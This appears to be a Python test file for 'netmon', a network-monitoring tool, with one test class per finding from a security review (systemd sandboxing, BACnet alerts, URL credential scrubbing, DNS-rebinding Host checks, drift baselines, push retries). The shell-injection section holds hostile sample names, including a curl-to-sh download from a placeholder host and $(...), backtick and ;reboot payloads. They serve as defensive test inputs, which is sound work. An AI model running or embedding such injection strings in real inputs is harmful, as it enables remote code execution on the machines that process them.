"""
What the outside review of 2026-11-05 found in netmon.
======================================================
One section per finding, named by its number in the review. Each test failed
on the code before its fix.

No network: the controller, ntfy and the clock are fakes, as elsewhere in
netmon_tests. Addresses are 10.10.x, 192.168.10.x and documentation ranges, and
every name is made up.
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# The shared test support lives in tests/ with the app's own tests.
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tests'))
import _test_support  # noqa: E402,F401

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXAMPLE = os.path.join(ROOT, 'netmon', 'profiles', 'example-site.yaml')
RULES = os.path.join(ROOT, 'netmon', 'rules')
DEPLOY = os.path.join(ROOT, 'netmon', 'deploy')


# ─── M23: the capture unit could not start ───────────────────────────────────

class TestTheCaptureUnitCanStart(unittest.TestCase):
    """
    systemd cannot run here, so this reads the unit. ProtectSystem=strict left
    /var read-only to the ExecStartPre mkdir, the bounding set had no CAP_CHOWN
    for its chown, and ReadWritePaths named a directory a fresh install does
    not have yet, which fails the namespace setup for the whole unit.
    """

    def settings(self, name):
        with open(os.path.join(DEPLOY, 'netmon-capture.service'),
                  encoding='utf-8') as handle:
            text = handle.read().replace('\\\n', ' ')
        return [line.split('=', 1)[1] for line in text.splitlines()
                if line.startswith(name + '=')]

    def test_the_directory_is_made_outside_the_sandbox(self):
        steps = self.settings('ExecStartPre')
        self.assertTrue(steps)
        for step in steps:
            with self.subTest(step=step.strip()):
                self.assertTrue(step.startswith('+'), step)

    def test_a_missing_directory_does_not_fail_the_namespace(self):
        paths = self.settings('ReadWritePaths')
        self.assertTrue(paths)
        for path in paths:
            with self.subTest(path=path.strip()):
                self.assertTrue(path.startswith('-'), path)

    def test_tcpdump_still_drops_to_the_netmon_user_itself(self):
        """
        User=netmon would start tcpdump unprivileged, and its -Z (which
        RingBuffer.capture_command emits) would then fail.
        """
        self.assertEqual(self.settings('User'), [])
        command = ' '.join(self.settings('ExecStart'))
        self.assertIn('-Z netmon', command)


# ─── M19: a BACnet SimpleACK raised a critical push ──────────────────────────

class TestBacnetAcknowledgements(unittest.TestCase):
    """
    A SimpleACK names the service it acknowledges, and the rule did not look
    at the APDU type, so the controller's reply to every allowed write was a
    critical finding of its own: the reply runs controller to workstation,
    which no allowlist entry covers.
    """

    @classmethod
    def setUpClass(cls):
        from netmon.profile import load_profile
        from netmon.rules_engine import load_rules
        cls.profile = load_profile(EXAMPLE)
        cls.rule = load_rules(RULES).by_id('bacnet_control')

    def fire(self, payload, src, dst):
        from netmon.events import Event, enrich
        from netmon.protocols.bacnet import parse
        event = Event(kind='bacnet', src_ip=src, dst_ip=dst, src_port=47808,
                      dst_port=47808, protocol='udp', vlan=20)
        event.fields.update(parse(payload).as_fields())
        enrich(event, self.profile)
        return self.rule.evaluate(event)

    @staticmethod
    def frame(apdu):
        body = bytes([0x01, 0x04]) + apdu
        return bytes([0x81, 0x0A]) + (4 + len(body)).to_bytes(2, 'big') + body

    def write_property(self):
        # Confirmed-Request, invoke 1, WriteProperty to analog-value-3.
        return self.frame(bytes([0x00, 0x05, 0x01, 15, 0x0C])
                          + ((2 << 22) | 3).to_bytes(4, 'big') + bytes([0x19, 85]))

    def simple_ack(self):
        return self.frame(bytes([0x20, 0x01, 15]))

    def test_the_acknowledgement_of_an_allowed_write_is_quiet(self):
        # 10.10.20.10 may write to 10.10.20.21 in the example profile.
        self.assertEqual(self.fire(self.write_property(),
                                   '10.10.20.10', '10.10.20.21'), [])
        self.assertEqual(self.fire(self.simple_ack(),
                                   '10.10.20.21', '10.10.20.10'), [])

    def test_a_write_outside_the_allowlist_still_fires(self):
        findings = self.fire(self.write_property(), '10.10.60.50', '10.10.20.21')
        self.assertEqual([f.rule_id for f in findings], ['bacnet_control'])
        self.assertEqual(findings[0].severity, 'critical')


# ─── M18: shell text in a suggested command ──────────────────────────────────

class TestSuggestedCommandsCarryNoShell(unittest.TestCase):
    """
    `next_check` is pasted into a root shell, and the names in it come from
    mDNS and DNS queries anyone on the network can send.
    """

    HOSTILE = ("printer$(touch /tmp/owned).local",
               "x'; curl http://203.0.113.9/s | sh; echo '",
               'name`id`', 'a;reboot', 'two\nlines')

    def unanswered(self, name):
        import netmon.handlers  # noqa: F401 -- registers the handler
        from netmon.events import Event
        from netmon.rules_engine import Rule
        rule = Rule({'id': 'unanswered_name', 'type': 'stateful',
                     'handler': 'unanswered_name', 'params': {'min_queries': 1}})
        event = Event(kind='mdns', src_ip='192.168.10.20', ts=1000.0,
                      fields={'query': name})
        findings = rule.evaluate(event)
        self.assertEqual(len(findings), 1)
        return findings[0].next_check

    def test_the_unanswered_name_is_one_quoted_word(self):
        import shlex
        for name in self.HOSTILE + ('Büro Drucker.local',):
            with self.subTest(name=name):
                command = self.unanswered(name).split('; if it', 1)[0]
                self.assertEqual(shlex.split(command), ['nslookup', name.lower()])

    def rendered(self, template, **fields):
        from netmon.events import Event
        from netmon.rules_engine import Rule
        rule = Rule({'id': 't', 'when': {'kind': 'tls'}, 'next_check': template})
        event = Event(kind='tls', src_ip='192.168.10.20', fields=fields)
        return rule.evaluate(event)[0].next_check

    def test_a_template_value_with_shell_characters_is_withheld(self):
        from netmon.rules_engine import UNSAFE_VALUE
        template = ("tshark -r <pcap> -Y 'tls.handshake.extensions_server_name "
                    "contains \"{sni}\"'")
        for value in self.HOSTILE:
            with self.subTest(value=value):
                command = self.rendered(template, sni=value)
                self.assertIn(UNSAFE_VALUE, command)
                self.assertNotIn(value, command)

    def test_ordinary_names_are_left_as_they_are(self):
        """Spaces and letters from any script: mDNS names have both."""
        for value in ('relay-9f2.net.example.test', 'Büro Drucker',
                      'fe80::1%eth0', '00:11:22:33:44:55', 'Kåre’s laptop'):
            with self.subTest(value=value):
                self.assertEqual(self.rendered("echo '{sni}'", sni=value),
                                 f"echo '{value}'")

    def test_descriptions_are_not_affected(self):
        """Only the command is pasted anywhere; a description is shown as text."""
        from netmon.events import Event
        from netmon.rules_engine import Rule
        rule = Rule({'id': 't', 'when': {'kind': 'tls'},
                     'describe': 'reached {sni}'})
        event = Event(kind='tls', fields={'sni': 'a;b'})
        self.assertEqual(rule.evaluate(event)[0].description, 'reached a;b')


# ─── H11: passwords in UniFi CSV URLs reached pushes and the model ───────────

class TestUrlsLoseTheirCredentials(unittest.TestCase):
    """
    The export keeps the whole URL. `name_seen` fell back to it, and
    remote_access_tool's description renders `name_seen`, so a login submitted
    by GET was pushed with its password in it.
    """

    SECRETS = ('Hunter2', 'tok3nV4lue', 'ABCDEF0123')
    URL = ('https://ops:Hunter2@relay.anydesk.example.test:8443/connect;'
           'jsessionid=ABCDEF0123?user=ops&password=Hunter2&token=tok3nV4lue#top')

    def test_the_url_keeps_scheme_host_and_path(self):
        from netmon.sources.unifi_csv import scrub_url
        self.assertEqual(scrub_url(self.URL),
                         'https://relay.anydesk.example.test:8443/connect')
        self.assertEqual(scrub_url('portal.example.test/login?pwd=x'),
                         'portal.example.test/login')
        self.assertEqual(scrub_url('http://[fe80::1]:8080/a?b=c'),
                         'http://[fe80::1]:8080/a')
        self.assertEqual(scrub_url(''), '')
        self.assertEqual(scrub_url('http://[broken/x?password=y'), '')

    def row(self):
        from netmon_tests.test_unifi_csv import row
        return row(**{'Dst. Domain': '', 'URL': self.URL,
                      'Src. Ip': '10.10.60.50', 'Dst. Ip': '203.0.113.7'})

    def test_parse_row_drops_them(self):
        from netmon.sources.unifi_csv import parse_row
        event = parse_row(self.row())
        for secret in self.SECRETS:
            self.assertNotIn(secret, event.fields['url'])

    def test_name_seen_is_only_the_host(self):
        from netmon.events import Event, enrich
        from netmon.profile import load_profile
        event = Event(kind='http', src_ip='10.10.60.50', dst_ip='203.0.113.7',
                      fields={'url': 'http://user:pw@cam.example.test/a?b=c'})
        enrich(event, load_profile(EXAMPLE))
        self.assertEqual(event.fields['name_seen'], 'cam.example.test')

    def test_nothing_reaches_a_push_or_the_model(self):
        import json
        from netmon.events import enrich
        from netmon.profile import load_profile
        from netmon.redact import AI, ALERT, audit, redact_finding
        from netmon.rules_engine import load_rules
        from netmon.sources.unifi_csv import parse_row
        profile = load_profile(EXAMPLE)
        event = parse_row(self.row())
        enrich(event, profile)
        findings = load_rules(RULES).by_id('remote_access_tool').evaluate(event)
        self.assertEqual(len(findings), 1)
        for audience in (ALERT, AI):
            record = redact_finding(findings[0], profile, audience)
            blob = json.dumps(record, default=str)
            with self.subTest(audience=audience):
                for secret in self.SECRETS:
                    self.assertNotIn(secret, blob)
                self.assertEqual(audit(record), [])

    def test_the_audit_knows_the_shape(self):
        from netmon.redact import audit
        for text in ('https://x.example.test/login?user=a&password=b',
                     '/portal;token=abc', '?api_key=1', '&apikey=1',
                     '?PWD=1', '&secret=1', '?passwd=1'):
            with self.subTest(text=text):
                self.assertTrue(audit(text))
        for text in ('monkey=1&donkey=2', '?keyboard=uk', 'token bucket',
                     '/password-reset'):
            with self.subTest(text=text):
                self.assertEqual(audit(text), [])


# ─── M21: alert extracts were taken for captures ─────────────────────────────

class TestExtractsAreNotCaptures(unittest.TestCase):
    """
    Extracts are written into the capture directory, and any .pcap there was
    a capture, dated by its mtime. A fresh extract therefore sorted newest:
    the service took the live tcpdump file for a finished one and analysed it
    half-written on every pass, and the extract "covered" the present.
    """

    def setUp(self):
        import shutil
        import tempfile
        import time
        from netmon.ringbuffer import RingBuffer
        self.scratch = tempfile.mkdtemp(prefix='netmon-review-ring-')
        self.addCleanup(shutil.rmtree, self.scratch, True)
        self.ring_dir = os.path.join(self.scratch, 'capture')
        os.makedirs(self.ring_dir)
        self.ring = RingBuffer(self.ring_dir)
        self.now = time.time()
        self.old = self.write(self.capture_name(self.now - 1800))
        self.live = self.write(self.capture_name(self.now - 600))
        self.extract = self.write('extract-20261105-101500.pcap', when=self.now)

    @staticmethod
    def capture_name(when):
        import time
        return time.strftime('netmon-%Y%m%d-%H%M%S.pcap', time.localtime(when))

    def write(self, name, when=None, size=64):
        path = os.path.join(self.ring_dir, name)
        with open(path, 'wb') as handle:
            handle.write(b'\0' * size)
        if when is not None:
            os.utime(path, (when, when))
        return path

    def test_the_ring_is_only_what_tcpdump_wrote(self):
        self.assertEqual([f['path'] for f in self.ring.files()],
                         [self.old, self.live])

    def test_the_present_is_covered_by_the_live_capture(self):
        covering = self.ring.files_covering(self.now - 10, self.now + 10)
        self.assertEqual([f['path'] for f in covering], [self.live])

    def test_the_live_capture_is_not_analysed(self):
        from netmon.service import Service, ServiceConfig
        config = ServiceConfig(profile_path=EXAMPLE, ring_dir=self.ring_dir,
                               state_dir=os.path.join(self.scratch, 'state'),
                               notify=False)
        config.web_port = None
        service = Service(config)
        with self.assertLogs('netmon.service', level='WARNING'):
            service.analyse_new_captures()          # the files are not pcaps
        self.assertIn(self.old, service.processed)
        self.assertNotIn(self.live, service.processed)
        self.assertNotIn(self.extract, service.processed)

    def test_extracts_are_pruned_by_age_and_count(self):
        self.ring.hours = 1
        self.ring.max_extracts = 2
        stale = self.write('extract-20261105-050000.pcap', when=self.now - 7200)
        recent = [self.write(f'extract-20261105-1{n}0000.pcap',
                             when=self.now - 300 + n) for n in range(3)]
        result = self.ring.prune(now=self.now)
        left = {e['path'] for e in self.ring.extracts()}
        self.assertNotIn(stale, left)
        self.assertEqual(left, {recent[2], self.extract})
        self.assertEqual(len(result['extracts_removed']), 3)
        # The captures are judged on their own terms, and none is old enough.
        self.assertEqual(result['removed'], [])


# ─── M22: the digest moved an hour earlier each day ──────────────────────────

class _DigestNotifier:
    """Takes the digest and pushes; ntfy never sees either."""

    def __init__(self):
        self.digests = []

    def send(self, findings):
        return list(findings), []

    def send_digest(self, analyzer, title=None, open_items=None, body=None):
        self.digests.append(body)
        return True


class TestTheDigestKeepsItsHour(unittest.TestCase):

    def setUp(self):
        import shutil
        import tempfile
        self.scratch = tempfile.mkdtemp(prefix='netmon-review-digest-')
        self.addCleanup(shutil.rmtree, self.scratch, True)

    @staticmethod
    def local(*parts):
        import time
        return time.mktime(tuple(parts) + (0,) * (6 - len(parts)) + (0, 0, -1))

    def test_after_a_digest_the_next_is_the_same_hour_tomorrow(self):
        import time
        from netmon.service import Service, ServiceConfig
        config = ServiceConfig(profile_path=EXAMPLE, notify=False, digest_hour=7,
                               state_dir=os.path.join(self.scratch, 'state'))
        config.web_port = None
        service = Service(config, clock=lambda: 0.0)
        service.notifier = _DigestNotifier()
        # A day well clear of any DST change.
        sent_at = self.local(2026, 6, 10, 7, 0, 5)
        service._next['digest'] = self.local(2026, 6, 10, 7)
        service.tick(now=sent_at)
        self.assertEqual(len(service.notifier.digests), 1)
        self.assertEqual(time.localtime(service._next['digest'])[:5],
                         (2026, 6, 11, 7, 0))

    def in_new_york(self):
        import time
        if not hasattr(time, 'tzset'):
            self.skipTest('time.tzset is not available on Windows')
        before = os.environ.get('TZ')

        def restore():
            if before is None:
                os.environ.pop('TZ', None)
            else:
                os.environ['TZ'] = before
            time.tzset()

        self.addCleanup(restore)
        # A POSIX rule rather than a zone name, so no tz database is needed.
        os.environ['TZ'] = 'EST5EDT,M3.2.0,M11.1.0'
        time.tzset()

    def test_the_autumn_change_does_not_fire_it_twice(self):
        import time
        from netmon.service import _next_occurrence
        self.in_new_york()
        # 2026-11-01 is the first Sunday in November: 02:00 EDT becomes 01:00.
        nxt = _next_occurrence(self.local(2026, 10, 31, 7, 0, 30), 7)
        self.assertEqual(time.localtime(nxt)[:5], (2026, 11, 1, 7, 0))
        after = _next_occurrence(nxt + 30, 7)
        self.assertEqual(time.localtime(after)[:5], (2026, 11, 2, 7, 0))

    def test_the_spring_change_does_not_make_it_late(self):
        import time
        from netmon.service import _next_occurrence
        self.in_new_york()
        # 2026-03-08 is the second Sunday in March: 02:00 EST becomes 03:00.
        nxt = _next_occurrence(self.local(2026, 3, 7, 7, 0, 30), 7)
        self.assertEqual(time.localtime(nxt)[:5], (2026, 3, 8, 7, 0))


# ─── M17: off loopback, the UI answered to any Host ──────────────────────────

class TestHostCheckOffLoopback(unittest.TestCase):
    """
    Bound to a management address, the UI skipped the Host check, so a page
    that rebound its own name to the sensor read the token and the profile
    from a browser on the management network, and could then write.
    """

    ADDRESS = '192.168.10.5'

    def setUp(self):
        import shutil
        import tempfile
        self.scratch = tempfile.mkdtemp(prefix='netmon-review-hosts-')
        self.addCleanup(shutil.rmtree, self.scratch, True)
        self.profile = os.path.join(self.scratch, 'site.yaml')
        shutil.copy(EXAMPLE, self.profile)
        self.start()

    def start(self, **extra):
        from netmon.web import WebServer
        self.server = WebServer(self.profile, RULES, None, host='127.0.0.1',
                                port=0, allow_edit=True, **extra)
        self.port = self.server.start()
        self.addCleanup(self.server.stop)
        # It listens on loopback, so nothing leaves this machine, and judges
        # requests as a sensor bound to a management address would.
        self.server.host = self.ADDRESS

    def request(self, method, path, host, headers=None):
        import http.client
        connection = http.client.HTTPConnection('127.0.0.1', self.port, timeout=5)
        self.addCleanup(connection.close)
        sent = {'Host': host}
        sent.update(headers or {})
        body = b'{}' if method == 'POST' else None
        if body is not None:
            sent['Content-Type'] = 'application/json'
        connection.request(method, path, body=body, headers=sent)
        response = connection.getresponse()
        return response.status, response.read().decode('utf-8', 'replace')

    def test_a_rebound_name_is_refused(self):
        for path in ('/', '/api/profile'):
            with self.subTest(path=path):
                status, body = self.request('GET', path, 'attacker.example')
                self.assertEqual(status, 421)
                self.assertNotIn(self.server.token, body)

    def test_the_bound_address_is_served(self):
        status, body = self.request('GET', '/', f'{self.ADDRESS}:{self.port}')
        self.assertEqual(status, 200)
        self.assertIn(self.server.token, body)

    def test_and_so_is_each_allowed_host(self):
        self.server.stop()
        self.start(allowed_hosts=['sensor.example.test'])
        for host in ('sensor.example.test', f'SENSOR.example.test.:{self.port}',
                     f'{self.ADDRESS}:{self.port}'):
            with self.subTest(host=host):
                status, body = self.request('GET', '/', host)
                self.assertEqual(status, 200)
                self.assertIn(self.server.token, body)
        self.assertEqual(self.request('GET', '/', 'attacker.example')[0], 421)

    def test_loopback_names_are_not_its_names_here(self):
        self.assertEqual(self.request('GET', '/', 'localhost')[0], 421)

    def test_writes_from_the_management_network_still_work(self):
        """--allow-edit from a management workstation is the documented use."""
        host = f'{self.ADDRESS}:{self.port}'
        status, _ = self.request('POST', '/api/reload', host, headers={
            'X-Netmon-Token': self.server.token, 'Origin': f'http://{host}'})
        self.assertEqual(status, 200)


class TestWhichNamesABindHas(unittest.TestCase):

    def server(self, host, allowed=()):
        from netmon.web import WebServer
        return WebServer(EXAMPLE, RULES, None, host=host, allowed_hosts=allowed)

    def test_a_wildcard_bind_will_not_start_without_allowed_hosts(self):
        from netmon.web import BindError
        for host in ('0.0.0.0', '::', ''):
            with self.subTest(host=host):
                with self.assertRaises(BindError) as ctx:
                    self.server(host)
                self.assertIn('--allowed-host', str(ctx.exception))
        self.assertEqual(self.server('0.0.0.0', ['192.168.10.5']).allowed_hosts(),
                         {'192.168.10.5'})

    def test_every_loopback_address_is_loopback(self):
        names = self.server('127.0.0.2').allowed_hosts()
        self.assertIn('127.0.0.2', names)
        self.assertIn('localhost', names)

    def test_ipv6_spellings_compare_equal(self):
        from netmon.web import _normal_host
        names = self.server('fe80:0:0::1').allowed_hosts()
        self.assertEqual(names, {'fe80::1'})
        self.assertIn(_normal_host('[FE80::0001]'), names)

    def test_the_command_lines_take_allowed_hosts(self):
        from netmon.service import _parser, config_from_args
        from netmon.web import _parser as web_parser
        extra = ['--allowed-host', 'sensor.example.test',
                 '--allowed-host', '192.168.10.5']
        args = _parser().parse_args(['--profile', EXAMPLE,
                                     '--web-host', '0.0.0.0'] + extra)
        self.assertEqual(config_from_args(args).allowed_hosts,
                         ('sensor.example.test', '192.168.10.5'))
        args = web_parser().parse_args(['--profile', EXAMPLE,
                                        '--host', '0.0.0.0'] + extra)
        self.assertEqual(args.allowed_host, ['sensor.example.test', '192.168.10.5'])

    def test_netmon_web_refuses_a_bare_wildcard_before_listening(self):
        import contextlib
        import io
        # Imported first: on code without the check, _main would listen.
        from netmon.web import BindError, _main  # noqa: F401
        err = io.StringIO()
        with contextlib.redirect_stderr(err), \
                contextlib.redirect_stdout(io.StringIO()):
            code = _main(['--profile', EXAMPLE, '--host', '0.0.0.0'])
        self.assertEqual(code, 1)
        self.assertIn('--allowed-host', err.getvalue())


# ─── H9: drift wiped its baseline when an endpoint failed ────────────────────

class TestDriftSurvivesAnOutage(unittest.TestCase):
    """
    A failed endpoint became an empty section, and the snapshot was saved
    anyway. During a controller reboot every firewall rule read as deleted
    (HIGH, pushed), and on recovery every forward read as new (pushed again).
    """

    RULES_ = [{'_id': 'f1', 'name': 'block ot to wan', 'enabled': True,
               'action': 'drop', 'ruleset': 'LAN_OUT'},
              {'_id': 'f2', 'name': 'old exception', 'enabled': False,
               'action': 'accept', 'ruleset': 'LAN_IN'}]
    FORWARDS = [{'_id': 'pf1', 'name': 'vendor vpn', 'enabled': True,
                 'src': '203.0.113.9', 'dst_port': '1194',
                 'fwd': '192.168.10.40', 'fwd_port': '1194', 'proto': 'udp'}]
    DEVICES = [{'_id': 'd1', 'mac': '02:00:00:00:10:01', 'name': 'sw-core',
                'port_table': [{'port_idx': 3, 'name': 'ahu',
                                'portconf_id': 'p1', 'up': True}]}]

    def setUp(self):
        import copy
        import shutil
        import tempfile
        from netmon_tests.test_drift import _FakeClient
        self.scratch = tempfile.mkdtemp(prefix='netmon-review-drift-')
        self.addCleanup(shutil.rmtree, self.scratch, True)
        self.path = os.path.join(self.scratch, 'unifi-config.json')
        self.client = _FakeClient(copy.deepcopy({
            'firewall_rules': self.RULES_, 'port_forwards': self.FORWARDS,
            'devices': self.DEVICES,
            'networks': [{'_id': 'n10', 'name': 'ot', 'vlan': 10}]}))

    def check(self):
        from netmon.drift import check
        from netmon_tests.test_drift import profile
        return check(self.client, profile(), self.path)

    def keys(self, findings, *rules):
        return sorted(f.key for f in findings if f.rule_id in rules)

    def test_a_failed_endpoint_reports_nothing_deleted_or_new(self):
        from netmon.drift import load_state
        self.check()
        self.client.fail = {'firewall_rules', 'port_forwards'}
        findings, report = self.check()
        self.assertEqual(self.keys(findings, 'firewall_change', 'exposure_change',
                                   'firewall_rule_disabled'), [])
        self.assertEqual(report['unread'], ['firewall_rules', 'port_forwards'])
        saved = load_state(self.path)
        self.assertEqual([r['_id'] for r in saved['firewall_rules']], ['f1', 'f2'])
        self.assertEqual([f['_id'] for f in saved['port_forwards']], ['pf1'])

        self.client.fail = set()
        findings, _ = self.check()                  # recovered
        self.assertEqual(self.keys(findings, 'firewall_change', 'exposure_change'),
                         ['port_forwards/pf1'])      # the inventory line only
        self.assertEqual(
            [f.tier for f in findings if f.key == 'port_forwards/pf1'], ['digest'])

    def test_a_failed_device_list_keeps_the_port_table(self):
        from netmon.drift import load_state
        self.check()
        baseline = load_state(self.path)['ports']
        self.client.fail = {'devices'}
        findings, _ = self.check()
        self.assertEqual(self.keys(findings, 'port_profile_change'), [])
        self.assertEqual(load_state(self.path)['ports'], baseline)
        # And the baseline is still a baseline: a real change shows.
        self.client.fail = set()
        self.client.data['devices'][0]['port_table'][0]['portconf_id'] = 'p2'
        findings, _ = self.check()
        self.assertEqual(self.keys(findings, 'port_profile_change'),
                         ['port/02:00:00:00:10:01/3'])

    def test_a_failed_section_keeps_its_standing_problems(self):
        _, report = self.check()
        before = {p['key'] for p in report['standing_problems']}
        self.assertIn('firewall_rules/f2', before)
        self.client.fail = {'firewall_rules'}
        findings, report = self.check()
        self.assertEqual({p['key'] for p in report['standing_problems']}, before)
        # Kept on the list, not reported afresh from a copy nobody re-read.
        self.assertNotIn('firewall_rules/f2', {f.key for f in findings})

    def test_nothing_read_at_all_raises_and_saves_nothing(self):
        from netmon.drift import CONFIG_ENDPOINTS, DriftError, load_state
        self.check()
        before = load_state(self.path)
        self.client.fail = set(CONFIG_ENDPOINTS)
        with self.assertRaises(DriftError):
            self.check()
        self.assertEqual(load_state(self.path), before)

    def test_an_empty_answer_is_doubted_once(self):
        """A rebooting controller can answer 200 with nothing in it."""
        self.check()
        self.client.data['firewall_rules'] = []
        findings, report = self.check()
        self.assertEqual(self.keys(findings, 'firewall_change'), [])
        self.assertIn('firewall_rules', report['unread'])
        findings, _ = self.check()                   # and again: it is real
        self.assertEqual(self.keys(findings, 'firewall_change'),
                         ['firewall_rules/f1', 'firewall_rules/f2'])

    def test_a_section_never_read_is_not_compared_against_nothing(self):
        self.client.fail = {'port_forwards'}
        self.check()                                 # the first run
        self.client.fail = set()
        findings, _ = self.check()
        self.assertEqual([f.tier for f in findings if f.key == 'port_forwards/pf1'],
                         ['digest'])                 # not "a new forward appeared"

    def test_the_service_keeps_the_standing_list_through_an_outage(self):
        from unittest import mock
        from netmon.drift import CONFIG_ENDPOINTS
        from netmon.service import Service, ServiceConfig
        client = self.client

        class _Client:
            def __init__(self, *args, **kwargs):
                pass

            site, host = client.site, client.host

            def login(self):
                return None

            def get(self, path):
                return client.get(path)

        config = ServiceConfig(profile_path=EXAMPLE, notify=False,
                               unifi_host='https://unifi.example.test',
                               state_dir=self.scratch)
        config.web_port = None
        service = Service(config)
        with mock.patch('netmon.sources.unifi_api.UnifiClient', _Client):
            service.check_drift()
            standing = list(service.window.standing)
            self.assertTrue(standing)
            client.fail = set(CONFIG_ENDPOINTS)
            with self.assertLogs('netmon.service', level='WARNING'):
                self.assertEqual(service.check_drift(), [])
        self.assertEqual(service.window.standing, standing)
        self.assertEqual(service.counts['errors'], 1)

    def test_the_command_says_so_and_fails(self):
        import contextlib
        import io
        import json
        from netmon.drift import CONFIG_ENDPOINTS, _main
        snapshot = os.path.join(self.scratch, 'snapshot.json')
        with open(snapshot, 'w', encoding='utf-8') as handle:
            json.dump({'taken_at': 1.0, 'errors': {
                name: 'HTTP 502' for name in CONFIG_ENDPOINTS}}, handle)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), \
                contextlib.redirect_stdout(io.StringIO()):
            code = _main(['--profile', EXAMPLE, '--from-file', snapshot])
        self.assertEqual(code, 1)
        self.assertIn('could not read any', err.getvalue())


# ─── H10: a failed push was never retried ────────────────────────────────────

class _Clock:
    def __init__(self, now=1_790_000_000.0):
        self.now = now

    def __call__(self):
        return self.now


class _Opener:
    """Stands in for the POST to ntfy; down until told otherwise."""

    def __init__(self, fail=True):
        self.fail = fail
        self.bodies = []

    def __call__(self, url, body, headers, timeout):
        if self.fail:
            raise OSError('connection refused')
        self.bodies.append(body.decode('utf-8'))
        return 200


class _Ring:
    """Cuts an extract on request and counts how often it was asked."""

    PATH = '/var/lib/netmon/capture/extract-20261105-031400.pcap'

    def __init__(self):
        self.cuts = 0

    def extract_for_finding(self, finding, seconds=30):
        self.cuts += 1
        return {'path': self.PATH, 'packets': 12}


def _canary_hit(src='192.168.10.66'):
    from netmon.events import Event, Finding
    event = Event(kind='canary', ts=1_790_000_000.0, src_ip=src,
                  dst_ip='10.10.20.250', dst_port=22)
    return Finding('canary_hit', 'Something touched the canary',
                   severity='high', tier='push', device=src, key=f'{src}/ssh',
                   description=f'{src} connected to the canary on ssh',
                   event=event)


class _ServiceWithNtfy(unittest.TestCase):

    def setUp(self):
        import shutil
        import tempfile
        self.scratch = tempfile.mkdtemp(prefix='netmon-review-push-')
        self.addCleanup(shutil.rmtree, self.scratch, True)
        self.clock = _Clock()
        self.opener = _Opener()
        self.ring = _Ring()

    def service(self, budget=None):
        from netmon.alerting import Notifier, NotifierConfig
        from netmon.service import Service, ServiceConfig
        config = ServiceConfig(profile_path=EXAMPLE, notify=False,
                               state_dir=os.path.join(self.scratch, 'state'))
        config.web_port = None
        service = Service(config, clock=self.clock)
        extra = {}
        if budget is not None:
            from netmon.alerting import PushBudget
            extra['budget'] = PushBudget(config.push_budget_path,
                                         per_hour=budget[0], reserve=budget[1],
                                         clock=self.clock)
        service.notifier = Notifier(
            NotifierConfig(server='https://ntfy.example.test', topic='site'),
            service.profile, opener=self.opener, ring=self.ring,
            silences=service.silences, **extra)
        service._next['digest'] = float('inf')     # no digest in these
        return service

    def tick(self, service, seconds):
        self.clock.now += seconds
        service.tick(now=self.clock.now)

    def deliver(self, service, finding):
        with self.assertLogs('netmon', level='WARNING'):
            service.deliver([finding])


class TestFailedPushesAreRetried(_ServiceWithNtfy):

    def test_the_notifier_says_which_pushes_failed(self):
        from netmon.alerting import Notifier, NotifierConfig
        notifier = Notifier(NotifierConfig(server='https://ntfy.example.test',
                                           topic='site'), opener=self.opener,
                            ring=self.ring)
        hit = _canary_hit()
        digest_only = _canary_hit('192.168.10.67')
        digest_only.tier = 'digest'
        with self.assertLogs('netmon.alerting', level='ERROR'):
            delivery = notifier.send([hit, digest_only])
        sent, skipped = delivery                    # as it always unpacked
        self.assertEqual(sent, [])
        self.assertEqual(len(skipped), 2)
        self.assertEqual(delivery.failed, [(hit, _Ring.PATH)])

    def test_a_retry_delivers_without_a_new_extract(self):
        from netmon.alerting import Notifier, NotifierConfig
        notifier = Notifier(NotifierConfig(server='https://ntfy.example.test',
                                           topic='site'), opener=self.opener,
                            ring=self.ring)
        hit = _canary_hit()
        with self.assertLogs('netmon.alerting', level='ERROR'):
            failed = notifier.send([hit]).failed
        self.opener.fail = False
        delivery = notifier.retry(failed)
        self.assertEqual(delivery.sent, [hit])
        self.assertEqual(self.ring.cuts, 1)
        self.assertIn(_Ring.PATH, self.opener.bodies[0])

    def test_a_canary_hit_during_an_outage_is_pushed_when_ntfy_returns(self):
        service = self.service()
        hit = _canary_hit()
        self.deliver(service, hit)
        self.assertEqual(service.recent[0].push_status, 'failed')
        self.assertEqual(service.recent[0].as_dict()['push_status'], 'failed')
        self.assertEqual(len(service.window.open_items()['failed_pushes']), 1)
        self.assertIn('Push failed, still retrying (1)', service.digest_body())
        self.assertIn('[push failed]', service.digest_body())

        self.opener.fail = False
        self.tick(service, 30)                      # not due yet
        self.assertEqual(self.opener.bodies, [])
        self.tick(service, 40)
        self.assertEqual(len(self.opener.bodies), 1)
        self.assertIn('canary', self.opener.bodies[0])
        self.assertEqual(self.ring.cuts, 1)          # the first one, re-used
        self.assertEqual(service.window.pending, {})
        self.assertEqual(service.recent[0].push_status, '')
        self.assertEqual(len(service.window.open_items()['pushes']), 1)
        self.tick(service, 3600)
        self.assertEqual(len(self.opener.bodies), 1)  # once

    def test_the_retries_back_off(self):
        service = self.service()
        self.deliver(service, _canary_hit())
        calls = []
        real = service.notifier.retry
        service.notifier.retry = lambda due: calls.append(1) or real(due)
        with self.assertLogs('netmon', level='WARNING'):
            self.tick(service, 61)                  # second failure: 2 min
        self.tick(service, 61)
        self.assertEqual(len(calls), 1)
        with self.assertLogs('netmon', level='WARNING'):
            self.tick(service, 60)
        self.assertEqual(len(calls), 2)

    def test_a_failed_push_survives_a_restart(self):
        self.deliver(self.service(), _canary_hit())
        restarted = self.service()
        self.assertEqual(restarted.recent[0].push_status, 'failed')
        self.opener.fail = False
        self.tick(restarted, 61)
        self.assertEqual(len(self.opener.bodies), 1)
        self.assertIn(_Ring.PATH, self.opener.bodies[0])

    def test_and_a_digest(self):
        """The window starts again after a digest; a push still owed does not."""
        service = self.service()
        self.deliver(service, _canary_hit())
        service.window.rollover()
        self.assertEqual(service.recent, [])
        self.assertFalse(service.window.admit(_canary_hit()))   # not pushed twice
        self.opener.fail = False
        self.tick(service, 61)
        self.assertEqual(len(self.opener.bodies), 1)

    def test_an_ack_answers_a_failed_push(self):
        service = self.service()
        self.deliver(service, _canary_hit())
        service.silences.add('ack', 'canary_hit', '192.168.10.66',
                             '192.168.10.66/ssh', reason='our scanner')
        self.opener.fail = False
        self.tick(service, 61)
        self.assertEqual(self.opener.bodies, [])
